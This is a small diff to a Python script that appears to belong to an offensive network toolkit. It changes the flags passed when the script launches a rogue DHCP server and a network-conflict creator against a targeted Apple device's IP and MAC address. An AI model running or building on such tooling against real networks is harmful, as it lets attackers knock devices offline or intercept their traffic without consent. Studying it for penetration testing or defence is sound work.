@@ -125,11 +125,11 @@ if __name__ == "__main__":
                 try:
                     if args.use_network_conflict:
                         sub.Popen(['python ' + script_dir + '/dhcp_rogue_server.py -i ' + listen_network_interface +
-                                   ' -I ' + apple_device[0] + ' -t ' + apple_device[1] + ' -q --new &'],
+                                   ' -I ' + apple_device[0] + ' -t ' + apple_device[1] + ' -q &'],
                                   shell=True)
                         sub.Popen(['python ' + script_dir + '/network_conflict_creator.py -i ' +
                                    listen_network_interface + ' -I ' + apple_device[0] + ' -t ' + apple_device[1] +
-                                   ' -q'], shell=True)
+                                   ' -p 2 -q'], shell=True)
                     else:
                         sub.Popen(['python ' + script_dir + '/dhcp_rogue_server.py -i ' + listen_network_interface +
                                    ' -I ' + apple_device[0] + ' -t ' + apple_device[1] + ' -q --apple &'],
